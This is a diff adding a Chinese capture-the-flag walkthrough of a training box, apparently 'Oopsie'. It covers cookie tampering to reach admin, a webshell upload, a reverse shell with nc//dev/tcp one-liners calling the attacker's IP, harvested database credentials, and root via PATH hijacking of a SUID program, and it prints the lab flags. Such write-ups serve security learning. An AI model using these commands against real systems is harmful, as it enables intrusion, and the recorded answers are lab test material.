@@ -633,4 +633,305 @@ dd6e058e814260bc70e9bbdef2715849
 
 Task 7 answer：vi
 
-answer：dd6e058e814260bc70e9bbdef2715849
+Task 9 answer：dd6e058e814260bc70e9bbdef2715849
+
+# 靶场：Oopsie
+
+## Task 1
+
+With what kind of tool can intercept web traffic?
+
+answer：proxy
+
+一般使用的HTTP/S流量劫持工具为BurpSuite、Yakit等
+
+## Task 2
+
+What is the path to the directory on the webserver that returns a login page?
+
+先进行端口扫描，服务器开启了22 SSH端口和80 TCP端口
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap -sC -sV 10.129.48.69 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 23:50 -0400
+Nmap scan report for 10.129.48.69
+Host is up (0.44s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.18 seconds
+
+```
+
+访问该站，可能有价值的信息只有邮箱`admin@megacorp.com`，之后对源代码进行查看发现存在调用`/cdn-cgi/login/script.js`，直接进行访问`http://10.129.48.69/cdn-cgi/login/`发现是登录后台
+
+answer：/cdn-cgi/login
+
+## Task 3
+
+What can be modified in Firefox to get access to the upload page?
+
+因为可以使用游客身份登录，所以在此没有着急去爆破账号密码，进入网站后发现有上传接口但是只有管理员才能使用，继续查看发现其他页面中url中包含id参数，`http://10.129.48.69/cdn-cgi/login/admin.php?content=accounts&id=1`，将id修改为1之后，就出现了管理员的Access ID等信息，拿到这些信息进行抓包试试越权的方向
+
+抓包文件上传后发送到repeater，修改关键信息
+```
+GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+Host: 10.129.48.69
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://10.129.48.69/cdn-cgi/login/admin.php?
+// 这里的 user=2233; role=guest修改为 user=34322; role=admin
+Cookie: user=34322; role=admin
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+```
+
+发现返回200 OK，直接放包进行查看成功进入文件上传页面，同理以上步骤也可以通过修改cookie处的Value也可以实现
+
+answer：cookie
+
+## Task 4
+
+What is the access ID of the admin user?
+
+在上一个步骤中已经得知了 admin 账户的Access ID为34322
+
+answer：34322
+
+## Task 5
+
+On uploading a file, what directory does that file appear in on the server?
+
+能文件上传的第一件事是干什么？！
+
+先挂个马再说，不行再换其他的
+
+**注意**：上传的时候拦截数据包也需要修改身份，上传成功后提示` The file webshell.php has been uploaded. `，现在要做的就是找到该站的文件上传的具体路径，直接使用**Gobuster**
+
+**参数**：
+1. `-u:`：指定url
+2. `-w`：指定字典
+3. `-x`：指定文件后缀
+```
+  
+┌──(kali㉿kali)-[~/Desktop]
+└─$ gobuster dir -u http://10.129.48.69/ -w /usr/share/wordlists/dirb/small.txt -x php
+
+```
+
+后面IP地址变了是因为服务器不稳定，重新开了一次
+
+文件上传的路径为`uploads              (Status: 301) [Size: 316] [--> http://10.129.48.109/uploads/]`
+
+answer：/uploads
+
+## Task 6
+
+What is the file that contains the password that is shared with the robert user?
+
+`http://10.129.48.109/uploads/webshell.php?cmd=whoami`，之后文件路径遍历发现也没什么敏感的信息或者其他
+
+先在webshell中ping我的攻击机ip发现可以连通，再进行端口测试，发现可以对我的kali的4444端口进行访问，那么到这里反向连接的条件就成立了
+
+```
+http://10.129.48.109/uploads/webshell.php?cmd=ping%20-c%203%2010.10.17.123
+
+http://10.129.48.109/uploads/webshell.php?cmd=curl%20http://10.10.17.123:4444
+
+// 攻击机回显
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.17.123] from (UNKNOWN) [10.129.48.109] 38370
+GET / HTTP/1.1
+Host: 10.10.17.123:4444
+User-Agent: curl/7.58.0
+Accept: */*
+
+```
+
+进行反向连接，进行抓包
+
+对目标机的操作：若终端没有响应，可用burp进行抓包重放，**ctrl+u**对参数进行unicode编码
+
+```
+// 实际上就是bash -c 'bash -i >& /dev/tcp/10.10.17.123/4444 0>&1'
+GET /uploads/s.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202%3E&1|nc%2010.10.17.123%204444%20%3E/tmp/f HTTP/1.1
+
+```
+
+对攻击机的操作：
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 4444
+
+```
+
+连接成功后，需要找包含与Robert用户共享密码的文件，Linux中默认的用户账户信息的存储位置在`/etc/passwd`，同时因为无法补全命令等问题，需要升级为交互式的shell
+
+交互式与非交互式shell的区别为：
+1. ==交互式模式==就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止 
+2. ==非交互式模式==就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止
+
+在靶机的shell中执行：`SHELL=/bin/bash script -q /dev/null`，执行后，你会看到Shell的提示符变得稍微“正常”一点（比如出现 `$` 或 `#`），但没有明显变化
+
+在kali终端按Ctrl+Z，这会把你当前的`nc`会话挂起到后台，之后后在kali终端执行`stty raw -echo`，**注意**：这条命令执行后，你的Kali终端会**完全不显示任何输入**（就像卡住一样），这是正常的。最后在kali终端输入`fg`并回车，这会把挂起的`nc`会话恢复到前台
+
+回到靶机shell中执行：`reset`，这一步会重置靶机的终端设置，可能会输出一些乱码，但最终会得到一个干净的提示符（经测试也可以不进行此操作），最后执行`export TERM=xterm`设置终端类型
+
+因为之前在进行文件目录遍历时，有发现一个db.php文件，所以先查看这个文件有没有什么敏感信息
+
+```
+www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php 
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+```
+
+answer：db.php
+
+## Task 7
+
+What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
+
+因为之前在`/etc/passwd`中查看到了Robert该用户的用户ID（UID）和组ID（GID），所以接下来直接查看当前用户组的执行权限
+
+**解释**：==2>/dev/null==这里的意思是把错误输出到黑洞里面
+
+```
+find / -type f group robert 2>/dev/null
+
+```
+
+发现没什么信息，于是再次输入`id`进行查看，发现有附加组bugtracker
+
+于是进行查找 `bugtracker` 组拥有的文件
+
+```
+robert@oopsie:/$ find / -group bugtracker -type f 2>/dev/null
+/usr/bin/bugtracker
+
+```
+
+answer：find
+
+## Task 8/9
+
+Task 8 Q：Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
+
+Task 9 Q：What SUID stands for?
+
+经以上步骤，接下来查看详细的文件信息
+
+**权限拆解部分**
+
+|     部分     |      值       |               含义                |
+| :--------: | :----------: | :-----------------------------: |
+|  **文件类型**  |     `-`      |       普通文件（`d`=目录，`l`=链接）       |
+| **所有者权限**  |    `rws`     | **r**（读）+ **w**（写）+ **s**（SUID） |
+|  **组权限**   |    `r-x`     |       **r**（读）+ **x**（执行）       |
+| **其他用户权限** |    `r--`     |            **r**（读）             |
+|  **所有者**   |    `root`    |          文件属于 root 用户           |
+|  **所属组**   | `bugtracker` |        文件属于 bugtracker 组        |
+
+发现`-rwsr-xr--` 中的 `s` 出现在**所有者权限**位置（`rws`），这表示：**SUID（Set owner User ID up on execution）已设置**，而SUID的作用就是，当普通用户执行这个文件时，**进程的有效用户ID（EUID）会变成文件所有者（root）**，而不是执行者（robert）；简单说：**robert 执行这个程序时，程序会以 root 权限运行**
+
+```
+robert@oopsie:/$ ls -la /usr/bin/bugtracker 
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+
+```
+
+Task 8 answer：root
+
+Task 9 answer：Set Owner User ID
+
+## Task 10
+
+What is the name of the executable being called in an insecure manner?
+
+因为Robert属于bugtracker组，所以有执行权限，输入bugtracker执行该命令，并进行测试id（随意）
+
+```
+robert@oopsie:/$ bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 6666
+---------------
+
+cat: /root/reports/6666: No such file or directory
+
+```
+
+注意到cat: /root/reports/6666，该命令使用cat来寻找该文件，并打印文件，但cat命令依赖path环境变量
+
+输出一下环境变量
+
+```
+robert@oopsie:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+```
+
+在环境目录添加一个恶意的cat命令，造成权限提升
+
+```
+robert@oopsie:/$ cd /tmp/ //切换到/tmp目录下
+robert@oopsie:/tmp$ echo '/bin/sh' > cat //在此构造恶意的cat命令
+robert@oopsie:/tmp$ chmod +x cat //赋予执行权限
+robert@oopsie:/tmp$ export PATH=/tmp:$PATH //将/tmp目录设置为环境变量
+
+robert@oopsie:/tmp$ echo $PATH 
+/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+```
+
+成功提权到root，切换到root目录找到flag
+
+```
+robert@oopsie:/tmp$ bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+# whoami
+root
+# cd /root
+# ls
+reports  root.txt
+# more root.txt
+af13b0bee69f8a877c3faf667f7beacf
+
+// 最后突然发现还有个Robert主目录的flag
+# more /home/robert/user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+
+```
+
+answer：cat
+Robert answer：f2c74ee8db7983851ab2a96a44eb7981
+Root answer：af13b0bee69f8a877c3faf667f7beacf
